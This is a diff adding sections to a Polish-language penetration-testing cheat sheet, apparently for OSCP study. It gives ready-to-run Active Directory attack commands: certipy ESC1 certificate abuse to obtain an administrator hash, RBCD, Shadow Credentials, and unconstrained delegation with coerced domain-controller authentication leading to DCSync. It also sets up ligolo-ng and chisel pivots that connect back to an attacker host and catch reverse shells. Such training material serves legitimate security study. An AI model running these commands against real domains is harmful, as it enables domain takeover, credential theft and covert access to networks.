@@ -2309,6 +2309,55 @@ impacket-psexec -hashes :<NTLM_admina> Administrator@$DC
 
 ---
 
+## 6.8 ADCS — Active Directory Certificate Services (ESC1)
+
+> Gdy w domenie jest **CA**, źle skonfigurowany szablon certyfikatu pozwala wystawić cert **na dowolnego usera** (np. Administratora) → uwierzytelnienie certem → hash NT / TGT. Potrzebujesz tylko **dowolnych poświadczeń domenowych**. Sync czasu z DC obowiązkowy (Kerberos).
+
+```bash
+# 1. Znajdz podatne szablony (certipy z Kali):
+certipy find -u '$user@$domain' -p '$pass' -dc-ip $dc -vulnerable -stdout
+#   szukaj w wyniku: [!] Vulnerabilities -> ESC1 (Enrollee Supplies Subject + Client Authentication)
+
+# 2. ESC1 — wystaw cert NA SIEBIE, ale z UPN admina (SAN):
+certipy req -u '$user@$domain' -p '$pass' -dc-ip $dc \
+  -ca '<nazwa-CA>' -template '<podatny-szablon>' -upn 'administrator@$domain'
+#   -> administrator.pfx
+
+# 3. Uwierzytelnij sie certem -> hash NT + TGT administratora:
+certipy auth -pfx administrator.pfx -dc-ip $dc
+#   -> Got hash for 'administrator@domain': aad3b...:<NThash>   (+ .ccache TGT)
+
+# 4. Wejdz hashem (PtH) albo biletem:
+impacket-psexec -hashes :<NThash> administrator@$dc
+```
+> **ESC8** = relay NTLM na webowy endpoint enrollmentu (`http://ca/certsrv`) — wymuś auth DC (PetitPotam) → `ntlmrelayx --adcs`. Pełna lista ESC1-16: `certipy find` sam je flaguje. ⚠️ Błąd `KRB_AP_ERR_SKEW` = rozjechany czas → `sudo ntpdate $dc`.
+
+## 6.9 Delegation abuse — RBCD / Shadow Credentials / Unconstrained
+
+> Nadużycie delegacji Kerberos = uzyskanie biletu jako dowolny user (np. DA) na usłudze celu. Dobierz technikę do tego, co masz.
+
+**RBCD (Resource-Based Constrained Delegation)** — gdy masz `GenericWrite`/`GenericAll` nad **obiektem komputera** + `MachineAccountQuota>0` (domyślnie 10):
+```bash
+impacket-addcomputer '$domain/$user:$pass' -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip $dc
+impacket-rbcd '$domain/$user:$pass' -delegate-from 'EVIL$' -delegate-to 'VICTIM$' -action write -dc-ip $dc
+impacket-getST '$domain/EVIL$:Passw0rd!' -spn 'cifs/victim.$domain' -impersonate Administrator -dc-ip $dc
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass victim.$domain            # SYSTEM na VICTIM
+```
+**Shadow Credentials** — gdy masz `GenericWrite`/`AllExtendedRights` nad userem/komputerem (AD CS + Win2016+). Czystsze niż reset hasła (nie psujesz konta):
+```bash
+certipy shadow auto -u '$user@$domain' -p '$pass' -account '<ofiara>' -dc-ip $dc
+#   -> NT hash ofiary; potem PtH / getTGT
+```
+**Unconstrained delegation** — na hoście z `TRUSTED_FOR_DELEGATION` łapiesz TGT każdego, kto się uwierzytelni:
+```powershell
+Rubeus.exe monitor /interval:5 /nowrap          # monitoruj przychodzace TGT
+# wymus logowanie DC (SpoolSample/PrinterBug lub PetitPotam) -> DC$ TGT wpada do pamieci
+# potem: Rubeus ptt /ticket:<b64> -> DCSync (§5.6)
+```
+
+---
+
 # 7. Lateral Movement (Ruch boczny)
 
 > Cel fazy: z jednego hosta na kolejny, zwykle z pozyskanymi poświadczeniami/hashem.
@@ -2606,7 +2655,22 @@ netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow pr
 # Pojedynczy port zamiast SOCKS:
 ./chisel client ATTACKER_IP:8000 R:3389:3.3.3.3:3389
 ```
-> Alternatywa premium: **ligolo-ng** (tworzy interfejs tun, nie potrzebujesz proxychains).
+### ligolo-ng (najwygodniejsze — tun interface, ZERO proxychains)
+> Robi wirtualny interfejs `tun` na Kali → skanujesz i łączysz się do głębszej sieci **natywnie** (nmap z SYN, evil-winrm, RDP — jak do lokalnej podsieci). Najlepsze na OSCP AD-pivot.
+```bash
+# 1. Na KALI (proxy) — raz przygotuj interfejs:
+sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
+./proxy -selfcert                                    # konsola ligolo (listener :11601)
+# 2. Na PIVOCIE (agent) — laczy sie do Ciebie (upload agent.exe/agent):
+./agent -connect $lhost:11601 -ignore-cert
+# 3. W konsoli ligolo:
+session                                              # wybierz agenta
+# 4. Na KALI dodaj trase do podsieci ZA pivotem:
+sudo ip route add 172.16.5.0/24 dev ligolo
+# 5. W ligolo:  start   -> teraz 172.16.5.x osiagalne WPROST:
+nmap -sV 172.16.5.10 ; evil-winrm -i 172.16.5.10 -u u -p p
+```
+> **Reverse shell z głębi sieci do Ciebie:** w konsoli ligolo `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444` — cel łączy się na `pivot:4444`, a Ty łapiesz na lokalnym `nc -lvnp 4444`.
 
 ## 8.4 Tunneling przez DPI (gdy filtrują ruch)
 
